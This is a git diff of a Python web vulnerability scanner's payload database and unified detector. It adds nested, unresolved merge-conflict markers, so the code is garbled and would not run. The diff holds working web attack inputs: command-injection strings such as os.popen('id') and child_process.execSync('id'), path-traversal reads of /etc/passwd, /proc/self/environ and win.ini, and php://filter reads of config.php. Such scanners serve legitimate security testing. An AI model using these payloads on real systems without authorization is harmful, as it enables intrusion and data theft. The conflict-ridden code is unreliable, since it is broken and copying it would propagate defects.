@@ -329,7 +329,10 @@ class PayloadDB:
         '| dir',
         '; dir',
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
+=======
+>>>>>>> 17c2b55 (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
         '& hostname',
         '| hostname',
         # PowerShell
@@ -340,7 +343,12 @@ class PayloadDB:
         # Template-style (for eval/exec contexts)
         '__import__("os").popen("id").read()',
         'require("child_process").execSync("id")',
+<<<<<<< HEAD
 >>>>>>> c98cf93 (Align directory structure, enhance detection patterns, fix crawler deadlock)
+=======
+=======
+>>>>>>> d718d2c (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
+>>>>>>> 17c2b55 (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
     ]
 
     # LFI payloads
@@ -350,12 +358,15 @@ class PayloadDB:
         '../../../etc/passwd%00',
         '..%2f..%2f..%2fetc/passwd',
 <<<<<<< HEAD
+<<<<<<< HEAD
         '/etc/passwd',
         'file:///etc/passwd',
         # Windows
         '..\\..\\..\\windows\\win.ini',
         '..\\..\\..\\boot.ini',
 =======
+=======
+>>>>>>> 17c2b55 (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
         '%2e%2e%2f%2e%2e%2fetc/passwd',
         '/etc/passwd',
         'file:///etc/passwd',
@@ -367,7 +378,17 @@ class PayloadDB:
         '..\\..\\..\\windows\\win.ini',
         '..\\..\\..\\boot.ini',
         '..\\..\\..\\windows\\system.ini',
+<<<<<<< HEAD
 >>>>>>> c98cf93 (Align directory structure, enhance detection patterns, fix crawler deadlock)
+=======
+=======
+        '/etc/passwd',
+        'file:///etc/passwd',
+        # Windows
+        '..\\..\\..\\windows\\win.ini',
+        '..\\..\\..\\boot.ini',
+>>>>>>> d718d2c (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
+>>>>>>> 17c2b55 (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
         # /proc/* files (Linux system info)
         '/proc/version',
         '../proc/version',
@@ -375,16 +396,26 @@ class PayloadDB:
         '../../../proc/version',
         '../../../../proc/version',
 <<<<<<< HEAD
+<<<<<<< HEAD
         '/../../../../../../../../../../proc/version',  # Acunetix style
 =======
         '/../../../../../../../../../../proc/version',
 >>>>>>> c98cf93 (Align directory structure, enhance detection patterns, fix crawler deadlock)
+=======
+        '/../../../../../../../../../../proc/version',
+=======
+        '/../../../../../../../../../../proc/version',  # Acunetix style
+>>>>>>> d718d2c (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
+>>>>>>> 17c2b55 (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
         '/proc/cpuinfo',
         '/proc/meminfo',
         '/proc/self/environ',
         '/proc/self/cmdline',
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
+=======
+>>>>>>> 17c2b55 (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
         '/proc/net/tcp',
         '/proc/1/cgroup',
         # Cloud/Container paths
@@ -404,11 +435,17 @@ class PayloadDB:
         # PHP wrappers
         'php://filter/convert.base64-encode/resource=index.php',
         'php://filter/convert.base64-encode/resource=../config.php',
+<<<<<<< HEAD
 >>>>>>> c98cf93 (Align directory structure, enhance detection patterns, fix crawler deadlock)
+=======
+=======
+>>>>>>> d718d2c (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
+>>>>>>> 17c2b55 (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
     ]
 
     # SQL error patterns for error-based detection
     SQL_ERRORS = [
+<<<<<<< HEAD
 <<<<<<< HEAD
         r"SQL syntax.*MySQL",
         r"Warning.*mysql_",
@@ -426,6 +463,8 @@ class PayloadDB:
         r"Unclosed quotation mark",
         r"syntax error at or near",
 =======
+=======
+>>>>>>> 17c2b55 (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
         # MySQL
         r"SQL syntax.*MySQL",
         r"Warning.*mysql_",
@@ -468,7 +507,27 @@ class PayloadDB:
         r"no such table:",
         # MariaDB
         r"MariaDB.*error",
+<<<<<<< HEAD
 >>>>>>> c98cf93 (Align directory structure, enhance detection patterns, fix crawler deadlock)
+=======
+=======
+        r"SQL syntax.*MySQL",
+        r"Warning.*mysql_",
+        r"MySQLSyntaxErrorException",
+        r"PostgreSQL.*ERROR",
+        r"Warning.*pg_",
+        r"Microsoft.*SQL Server.*Driver",
+        r"OLE DB.*SQL Server",
+        r"SQLServer JDBC Driver",
+        r"Oracle.*Driver",
+        r"Warning.*oci_",
+        r"SQLite.*Exception",
+        r"Warning.*sqlite_",
+        r"You have an error in your SQL syntax",
+        r"Unclosed quotation mark",
+        r"syntax error at or near",
+>>>>>>> d718d2c (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
+>>>>>>> 17c2b55 (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
     ]
 
 
@@ -862,6 +921,7 @@ class XSSDetector:
 # UNIFIED DETECTOR
 # =============================================================================
 
+<<<<<<< HEAD
 # =============================================================================
 # RCE DETECTOR
 # =============================================================================
@@ -1015,6 +1075,8 @@ class LFIDetector:
 # UNIFIED DETECTOR
 # =============================================================================
 
+=======
+>>>>>>> d718d2c (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
 class VulnDetector:
     """
     Unified vulnerability detector using pure Python libraries.
@@ -1024,7 +1086,11 @@ class VulnDetector:
         results = detector.scan(
             url='http://target/page.php',
             parameter='id',
+<<<<<<< HEAD
             vuln_types=['sqli', 'xss', 'rce', 'lfi']
+=======
+            vuln_types=['sqli', 'xss']
+>>>>>>> d718d2c (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
         )
     """
 
@@ -1047,8 +1113,11 @@ class VulnDetector:
         self.timeout = timeout
         self.sqli_detector = SQLiDetector(self.session, timeout)
         self.xss_detector = XSSDetector(self.session, timeout)
+<<<<<<< HEAD
         self.rce_detector = RCEDetector(self.session, timeout)
         self.lfi_detector = LFIDetector(self.session, timeout)
+=======
+>>>>>>> d718d2c (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
 
     def scan(self,
              url: str,
@@ -1080,6 +1149,7 @@ class VulnDetector:
             xss_results = self.xss_detector.detect(url, parameter, method, data)
             results.extend(xss_results)
 
+<<<<<<< HEAD
         if 'rce' in vuln_types:
             rce_results = self.rce_detector.detect(url, parameter, method, data)
             results.extend(rce_results)
@@ -1088,6 +1158,8 @@ class VulnDetector:
             lfi_results = self.lfi_detector.detect(url, parameter, method, data)
             results.extend(lfi_results)
 
+=======
+>>>>>>> d718d2c (Improve LFI detection: boost 'file' param confidence, add /proc payloads, seed common endpoints)
         return results
 
     def scan_endpoints(self,
